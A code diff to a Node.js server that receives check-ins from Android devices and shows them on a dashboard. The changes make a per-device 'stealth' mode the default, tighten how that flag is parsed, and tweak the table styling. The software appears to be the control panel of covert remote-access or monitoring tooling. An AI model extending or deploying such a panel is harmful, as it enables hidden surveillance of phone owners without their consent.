@@ -253,7 +253,7 @@ function handleCheckin(req, res) {
             battery: data.battery || '100%',
             ip: data.ip || req.ip || '127.0.0.1',
             port: data.port || 9191,
-            stealth: !!data.stealth,
+            stealth: (data.stealth !== undefined && data.stealth !== null) ? (data.stealth === true || data.stealth === 'true' || data.stealth === 1 || data.stealth === '1') : (existing && existing.stealth !== undefined ? existing.stealth : true),
             lastSeen: new Date().toISOString(),
             ...data
         };
@@ -544,7 +544,7 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
                 <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
                 <td style="vertical-align: middle;">${d.battery || '100%'}</td>
-                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
+                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle; word-break: break-all; max-width: 170px;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td style="vertical-align: middle;">${statusBadge}</td>
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
@@ -815,7 +815,7 @@ app.all('*', (req, res) => {
     }
 
     if (!devices.has(deviceId)) {
-        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
+        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: true, lastSeen: new Date().toISOString() });
         saveData();
     }
 
